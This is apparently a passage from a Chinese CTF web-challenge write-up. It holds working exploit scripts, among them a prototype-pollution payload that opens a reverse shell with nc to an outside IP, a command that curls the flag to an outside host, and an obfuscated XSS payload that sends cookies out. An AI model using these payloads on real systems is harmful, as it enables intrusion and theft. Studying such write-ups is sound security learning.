class="string">'不要搞这些奇奇怪怪的东西。'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里是<code>$parts = parse_url($url);</code></p>
<p><a href="https://www.php.net/manual/zh/function.parse-url.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.parse-url.php</a> </p>
</blockquote>
<p><code>/eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $gf;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">content_to_file</span><span class="params">($content)</span></span>&#123;	</span><br><span class="line">		$passwd = $_GET[<span class="string">'pass'</span>];</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z]+\.passwd$/m'</span>,$passwd)) </span><br><span class="line">	&#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strpos($passwd,<span class="string">"20200202"</span>))&#123;</span><br><span class="line">			<span class="keyword">echo</span> file_get_contents(<span class="string">"/"</span>.$content);</span><br><span class="line">		&#125;</span><br><span class="line">		 &#125; </span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aiisc_to_chr</span><span class="params">($number)</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(strlen($number)&gt;<span class="number">2</span>)&#123;</span><br><span class="line">		$str = <span class="string">""</span>;</span><br><span class="line">		 $number = str_split($number,<span class="number">2</span>);</span><br><span class="line">		 <span class="keyword">foreach</span> ($number <span class="keyword">as</span> $num ) &#123;</span><br><span class="line">		 	$str = $str .chr($num);</span><br><span class="line">		 &#125;</span><br><span class="line">		 <span class="keyword">return</span> strtolower($str);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> chr($number);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">calc</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$gf=<span class="keyword">$this</span>-&gt;gf;</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">'/[a-zA-z0-9]|\&amp;|\^|#|\$|%/'</span>, $gf))&#123;</span><br><span class="line">		  	<span class="keyword">eval</span>(<span class="string">'$content='</span>.$gf.<span class="string">';'</span>);</span><br><span class="line">		  	$content =  <span class="keyword">$this</span>-&gt;aiisc_to_chr($content); </span><br><span class="line">		  	<span class="keyword">return</span> $content;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content_to_file(<span class="keyword">$this</span>-&gt;calc());</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">unserialize((base64_decode($_GET[<span class="string">'code'</span>])));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>绕过正则用<code>%0a</code>，两位的限制，它最后有个<code>tolowercase()</code>，可以用大写绕过，</p>
<p>字母的过滤，利用取反操作</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">'FLAG'</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    res += str(ord(i))</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $gf;</span><br><span class="line">&#125;</span><br><span class="line">$s = <span class="string">"70766571"</span>;</span><br><span class="line">$s = urlencode(~$s);</span><br><span class="line">$a = <span class="keyword">new</span> trick();</span><br><span class="line">$a-&gt;gf = urldecode(<span class="string">'~'</span>.$s);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($a));</span><br><span class="line"><span class="comment">//另一种写法</span></span><br><span class="line"><span class="comment">//$a = new trick();</span></span><br><span class="line"><span class="comment">//$a-&gt;gf = '~'.(~'70766571');</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo1OiJ0cmljayI6MTp7czoyOiJnZiI7czo5OiJ+yM&#x2F;IycnKyM4iO30&#x3D;</span><br></pre></td></tr></table></figure>

<p>url编码下即可</p>
<hr>
<p>=================================分割线</p>
<p>上面是做过的</p>
<p>=================================分割线</p>
<hr>
<h4><span id="hackme">hackme</span></h4><blockquote>
<p>session.serialize_handler误用导致的反序列化问题：</p>
<p><a href="https://www.cnblogs.com/sijidou/p/10455646.html" target="_blank" rel="noopener">https://www.cnblogs.com/sijidou/p/10455646.html</a></p>
<p>绕过代码中给出的限制参考bytectf原题：四字符写shell写shell后cat /flag</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib:&#x2F;&#x2F;data:@127.0.0.1&#x2F;baidu.com?,ls</span><br></pre></td></tr></table></figure>

<hr>
<h4><span id="guessgame">GuessGame</span></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(config.enableReg &amp;&amp; noDos(regExp) &amp;&amp; flag.match(regExp))&#123;</span><br><span class="line">	<span class="comment">//res.end(flag);</span></span><br><span class="line">	<span class="comment">//Stop your wishful thinking and go away!</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(req.query.q === flag)</span><br><span class="line">	result+=flag;</span><br><span class="line">res.end(result);</span><br></pre></td></tr></table></figure>

<p>原型链污染</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;"user":&#123;"username":"admın888","__proto__": &#123;"enableReg": True&#125;&#125;&#125;)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>50行使用regExp来匹配flag，regExp可控，因此可以构造特殊表达式控制匹配时间</p>
<p>假设flag为：flag{klasdfjasfasdfadffsdfas}</p>
<p>构造var reg = /^flag{(((([a-zA-Z0-9]+)+)+)+)+1$/</p>
<p>匹配的时间会相当长</p>
<p>再构造var reg = /^flag{a(((([a-zA-Z0-9]+)+)+)+)+1$/匹配时间会很短（匹配到k!=a会直接结束）因此可以通过匹配时间来判断flag，但是还没太想好 </p>
<p>秘笈！手工盲注！</p>
</blockquote>
<p>====================分割线</p>
<p>emm自己本地搭了个</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> flag = <span class="string">"flag&#123;klasdfjasfasdfadffsdfas&#125;"</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> regExp = req.query.q;</span><br><span class="line">    <span class="built_in">console</span>.log(regExp);</span><br><span class="line">    <span class="built_in">console</span>.log(flag);</span><br><span class="line">    <span class="keyword">if</span>(flag.match(regExp))&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    res.send(<span class="string">'ok'</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8081</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> host = server.address().address</span><br><span class="line">    <span class="keyword">var</span> port = server.address().port</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"应用实例，访问地址为 http://%s:%s"</span>, host, port)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>下面的payload测试成功</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^(?&#x3D;xx)(.*)*aaaaa$	&#x2F;&#x2F;xxx匹配上会延时，并且结尾不能是aaaaa</span><br></pre></td></tr></table></figure>

<p>=================分割线</p>
<p>看了vn的wp，直接rce，当时也有点疑问，被污染的参数明明会触发，为啥不能rce。。。</p>
<p>v&amp;n的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">theips = [<span class="string">"http://121.37.179.47:8081/"</span>,<span class="string">"http://121.37.167.12:80"</span>,<span class="string">"http://121.37.167.12:81"</span>,<span class="string">"http://121.37.167.12:82"</span>]</span><br><span class="line">proxies=&#123;<span class="string">"http"</span>:<span class="string">"http://localhost:4476"</span>&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> theips:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.post(i,json=&#123;<span class="string">"user"</span>:&#123;<span class="string">"username"</span>:<span class="string">"admIn888"</span>,<span class="string">"__proto__"</span>:&#123;<span class="string">"enableReg"</span>:<span class="literal">True</span>,<span class="string">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('rm /tmp/fa;mkfifo /tmp/fa;cat /tmp/fa|/bin/sh -i 2&gt;&amp;1|nc 106.14.15.50 1234 &gt; /tmp/fa ');var __tmp2"</span>&#125;&#125;&#125;,timeout=<span class="number">1</span>,proxies=proxies)</span><br><span class="line">            requests.get(i,timeout=<span class="number">1</span>,proxies=proxies)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<hr>
<h4><span id="nothardweb">NothardWeb</span></h4><p>cbc字节翻转攻击，对于已知明文和密文，即可构造我们需要的明文对应的密文</p>
<p>分析明文和密文，因为是明文最后需要反序列化，因此cbc字节翻转攻击需要iv，思路是利用cbc选择密文攻击得到iv，但是好像又不行，似乎需要控制任意明文才行</p>
<p>================分割线</p>
<p>因为key生成的方式<code>strval(mt_rand() &amp; 0x5f5e0ff)</code>， <code>0x5f5e0ff = 0b101111101011110000011111111</code>，19个1有54w多种情况，带入解码如果正确解码说明key是正确的</p>
<p>de1ta的脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cccc=<span class="string">"%d0%d%d%d%d%d0%d0%d%d%d%d00000%d%d%d%d%d%d%d%d"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($a=<span class="number">0</span>; $a &lt; <span class="number">2</span>; $a++) &#123; </span><br><span class="line">    <span class="keyword">for</span> ($b=<span class="number">0</span>; $b &lt; <span class="number">2</span>; $b++) &#123; </span><br><span class="line">        <span class="keyword">for</span> ($c=<span class="number">0</span>; $c &lt; <span class="number">2</span>; $c++) &#123; </span><br><span class="line">            <span class="keyword">for</span> ($d=<span class="number">0</span>; $d &lt; <span class="number">2</span>; $d++) &#123; </span><br><span class="line">                <span class="keyword">for</span> ($e=<span class="number">0</span>; $e &lt; <span class="number">2</span>; $e++) &#123; </span><br><span class="line">                    <span class="keyword">for</span> ($f=<span class="number">0</span>; $f &lt; <span class="number">2</span>; $f++) &#123; </span><br><span class="line">                        <span class="keyword">for</span> ($g=<span class="number">0</span>; $g &lt; <span class="number">2</span>; $g++) &#123; </span><br><span class="line">                            <span class="keyword">for</span> ($h=<span class="number">0</span>; $h &lt; <span class="number">2</span>; $h++) &#123; </span><br><span class="line">                                <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; <span class="number">2</span>; $i++) &#123; </span><br><span class="line">                                    <span class="keyword">for</span> ($j=<span class="number">0</span>; $j &lt; <span class="number">2</span>; $j++) &#123; </span><br><span class="line">                                        <span class="keyword">for</span> ($k=<span class="number">0</span>; $k &lt; <span class="number">2</span>; $k++) &#123; </span><br><span class="line">                                            <span class="keyword">for</span> ($l=<span class="number">0</span>; $l &lt; <span class="number">2</span>; $l++) &#123; </span><br><span class="line">                                                <span class="keyword">for</span> ($m=<span class="number">0</span>; $m &lt; <span class="number">2</span>; $m++) &#123; </span><br><span class="line">                                                    <span class="keyword">for</span> ($n=<span class="number">0</span>; $n &lt; <span class="number">2</span>; $n++) &#123; </span><br><span class="line">                                                        <span class="keyword">for</span> ($o=<span class="number">0</span>; $o &lt; <span class="number">2</span>; $o++) &#123; </span><br><span class="line">                                                            <span class="keyword">for</span> ($p=<span class="number">0</span>; $p &lt; <span class="number">2</span>; $p++) &#123; </span><br><span class="line">                                                                <span class="keyword">for</span> ($q=<span class="number">0</span>; $q &lt; <span class="number">2</span>; $q++) &#123; </span><br><span class="line">                                                                    <span class="keyword">for</span> ($r=<span class="number">0</span>; $r &lt; <span class="number">2</span>; $r++) &#123; </span><br><span class="line">                                                                        <span class="keyword">for</span> ($s=<span class="number">0</span>; $s &lt; <span class="number">2</span>; $s++) &#123; </span><br><span class="line">                                                                            $f_key=sprintf($cccc,$a,$b,$c,$d,$e,$f,$g,$h,$i,$j,$k,$l,$m,$n,$o,$p,$q,$r,$s);</span><br><span class="line">                                                                            $key=base_convert($f_key,<span class="number">2</span>,<span class="number">10</span>);</span><br><span class="line">                                                                            $result=decode_aes($key);</span><br><span class="line">                                                                            <span class="keyword">if</span>(stripos($result,<span class="string">"guest"</span>))&#123;</span><br><span class="line">                                                                                <span class="keyword">echo</span> $result;</span><br><span class="line">                                                                                <span class="keyword">echo</span> $key.<span class="string">"\n"</span>;</span><br><span class="line">                                                                            &#125;</span><br><span class="line">                                                                        &#125;</span><br><span class="line">                                                                    &#125;</span><br><span class="line">                                                                &#125;</span><br><span class="line">                                                            &#125;</span><br><span class="line">                                                        &#125;</span><br><span class="line">                                                    &#125;</span><br><span class="line">                                                &#125;</span><br><span class="line">                                            &#125;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode_aes</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">    $ch=base64_decode(<span class="string">"NGtWc0JCQ080dkNxcnhtVjVOSG1rQ3hWckRab3pjWkllTmdJMmovclR4YktzNk9FTERBSnYxSUNKVmQ4Qk55Qg=="</span>);</span><br><span class="line">    $de = openssl_decrypt($ch,<span class="string">"des-cbc"</span>,$key,<span class="number">0</span>,<span class="string">"abcdabcd"</span>);</span><br><span class="line">    <span class="keyword">return</span> $de;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>遍历得到的key异或还原出iv，然后再和hash比较，找出正确的iv</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$key = strval(<span class="number">94675148</span>);<span class="comment">//每次会变</span></span><br><span class="line">$p = openssl_decrypt($cipher, <span class="string">'des-cbc'</span>, $key, <span class="number">0</span>, $iv);</span><br><span class="line">print_r($p.<span class="string">"&lt;br/&gt;"</span>);</span><br><span class="line">$iv = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">8</span>; $i++) &#123;·<span class="comment">//还原iv就是和密文和第一组明文进行异或</span></span><br><span class="line">	$iv .= chr(ord($p[$i]) ^ ord($plain[$i]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>非预期：但是因为这里的<code>iv</code>和<code>key</code>是保存在session中，shana师傅直接删除sessionid，那么就都为空了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sessionUser &#x3D; base64_encode(openssl_encrypt($user, &#39;des-cbc&#39;, &#39;&#39;, 0, &#39;&#39;));</span><br></pre></td></tr></table></figure>

<p>之后是个tomcat的PUT方法传shell的漏洞，传个ew代理</p>
<p>=========================分割线</p>
<p>vp的wp还有另一种思路</p>
<blockquote>
<p>浏览题目，初步分析此处为 mt_rand 特性，第一次访问时可以拿到 第一次，第 227，228 次生成的随机数，爆破随机数种子之后可以得到 第 229 个随机数，得到密钥。</p>
</blockquote>
<hr>
<h4><span id="dooog">dooog</span></h4><p>cmd有很明显的逻辑漏洞，可以绕过对cmd的判断</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if int(time.time()) - data[&#39;timestamp&#39;] &lt; 60:</span><br><span class="line">	if cmd not in [&#39;whoami&#39;, &#39;ls&#39;]:</span><br><span class="line">		return &#39;cmd error&#39;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>简单分析下源码</p>
<p>在<code>/getTGT</code>中，用<code>(username + &#39;|&#39; + session_key + &#39;|&#39; + str(int(time.time())))</code>生成<code>TGT</code>的KEY我们不知道，但是知道加密结果<code>TGT</code>，用<code>session_key</code>生成<code>session_key_enc</code>的KEY我们是我们可控的<code>master_key</code>，</p>
<p>在<code>/getTicket</code>中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cryptor &#x3D; AESCipher(app.config.get(&#39;SECRET_KEY&#39;))</span><br><span class="line">auth_data &#x3D; cryptor.decrypt(base64.b64decode(TGT)).split(&#39;|&#39;)</span><br><span class="line">cryptor &#x3D; AESCipher(auth_data[1])</span><br></pre></td></tr></table></figure>

<p>发现生成<code>authenticator</code>的KEY就是<code>session_key</code>，之后<code>session_key2</code>生成<code>client_message</code>的KEY也是<code>session_key</code>，生成<code>server_message</code>的KEY是<code>master_key</code></p>
<p>最后，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">client_message, server_message &#x3D; res.content.split(&#39;|&#39;)</span><br><span class="line">session_key &#x3D; cryptor.decrypt(base64.b64decode(client_message))</span><br><span class="line">cryptor &#x3D; AESCipher(session_key)</span><br><span class="line">authenticator &#x3D; base64.b64encode(cryptor.encrypt(username))</span><br></pre></td></tr></table></figure>

<p>对<code>authenticator</code>进行加密的KEY是<code>session_key2</code>。</p>
<p>然后就可以写脚本了。抄一下作业</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> toolkit <span class="keyword">import</span> AESCipher</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">cryptor = AESCipher(<span class="string">'00000000'</span>)</span><br><span class="line">authenticator = cryptor.encrypt(json.dumps(&#123;<span class="string">'username'</span>:<span class="string">'Q7'</span>,<span class="string">'timestamp'</span>:int(time.time())&#125;))</span><br><span class="line">au = base64.b64encode(authenticator)</span><br><span class="line"><span class="keyword">print</span> au</span><br><span class="line">tgt = requests.post(<span class="string">'http://121.37.164.32:5001/getTGT'</span>,data=&#123;<span class="string">'username'</span>:<span class="string">'Q7'</span>,<span class="string">'authenticator'</span>: au&#125;).content</span><br><span class="line"><span class="keyword">print</span> tgt</span><br><span class="line">session_key, tgt = cryptor.decrypt(base64.b64decode(tgt.split(<span class="string">'|'</span>)[<span class="number">0</span>])), tgt.split(<span class="string">'|'</span>)[<span class="number">1</span>]</span><br><span class="line">cryptor = AESCipher(session_key)</span><br><span class="line">authenticator = base64.b64encode(cryptor.encrypt(json.dumps(&#123;<span class="string">'username'</span>: <span class="string">'Q7'</span>,<span class="string">'timestamp'</span>: int(time.time())<span class="number">-100</span>&#125;)))</span><br><span class="line">res = requests.post(<span class="string">'http://121.37.164.32:5001/getTicket'</span>, data=&#123;<span class="string">'username'</span>: <span class="string">'Q7'</span>, <span class="string">'authenticator'</span>: authenticator, <span class="string">'TGT'</span>:tgt, <span class="string">'cmd'</span>: <span class="string">'''curl q71998.cn:2333 -d `/readflag` '''</span>&#125;).content</span><br><span class="line"><span class="keyword">print</span> res</span><br><span class="line">client_message, server_message = res.split(<span class="string">'|'</span>)</span><br><span class="line">session_key = cryptor.decrypt(base64.b64decode(client_message))</span><br><span class="line">cryptor = AESCipher(session_key)</span><br><span class="line">authenticator = base64.b64encode(cryptor.encrypt(<span class="string">"Q7"</span>))</span><br><span class="line">res = requests.post(<span class="string">'http://121.37.164.32:5002/cmd'</span>,</span><br><span class="line">data=&#123;<span class="string">'server_message'</span>: server_message, <span class="string">'authenticator'</span>:authenticator&#125;).content</span><br><span class="line"><span class="keyword">print</span> res</span><br></pre></td></tr></table></figure>

<hr>
<h4><span id="baby_java">baby_java</span></h4><p>xxe读取hint.txt</p>
<p>依赖里有fastjson，版本为<code>1.2.48</code>，可以利用这个版本的反序列化漏洞</p>
<blockquote>
<p>而prefix是想考fastjson会自动处理 <code>-</code> 和<code>_</code> 的特性，在fastjson中， parseField 这个函数里<br>会去掉字符串中的 <code>-</code> 和开头的下划线，因此带个 - 就可以了</p>
</blockquote>
<hr>
<h4><span id="happyvacation">happyvacation</span></h4><p>还没看题就被队友秒了🤦‍♂️，</p>
<p>有个非预期，利用下面的将上传黑名单置为<code>false</code>，从而上传任意后缀文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;\$this-&gt;&quot;.$answer.&quot; &#x3D; false;&quot;);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>控制header头，设置为gbk，可以利用宽字节使单引号逃逸。从而xss<code>http://159.138.4.209:1002/quiz.php?referer=Content-Type: text/html; charset=GBK; Referer: index&amp;answer=user-&gt;url-&gt;pre</code></p>
</blockquote>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;1%aa&#39;;var d&#x3D;String.fromCharCode(100,111,99,117,109,101,110,116);var c &#x3D;String.fromCharCode(99,111,111,107,105,101);var w&#x3D;String.fromCharCode(119,105,110,100,111,119);var o&#x3D;String.fromCharCode(111,112,101,110);var ip &#x3D; String.fromCharCode(47,47,52,55,46,50,52,48,46,52,56,46,52,50,58,50,51,51,51,47);self[w].open(ip%2bself[d][c]);&#x2F;&#x2F;&#96;</span><br></pre></td></tr></table></figure>

<hr>
<h4><span id="hardphp">hardphp</span></h4><p>第一步去混淆。</p>
<h4><span id="easyweb">easyweb</span></h4><p>用下面的包能读取文件，wp没解释。。。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;createmd?operate&#x3D;file&amp;isConvert&#x3D;true HTTP&#x2F;1.1</span><br><span class="line">Host: 121.36.222.22:801</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;62.0.3202.9 Safari&#x2F;537.36</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line">Referer: http:&#x2F;&#x2F;121.36.222.22:801&#x2F;profile.jsp</span><br><span class="line">Content-Length: 39</span><br><span class="line">Cookie: JSESSIONID&#x3D;A33FFBFC70E5BF80F9D1E212F7C6402C;session_id&#x3D;7b0e89e7d9943a4581d96c705d3084537b12fcee</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![](http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;profile.jsp)</span><br></pre></td></tr></table></figure>

<p><code>start.sh</code></p>
<blockquote>
<p>再看到 <code>/home/tomcat/webapps/ROOT/WEB-INF/libs/</code> 下 <code>Common Collections 为 3.1</code>，有漏洞。</p>
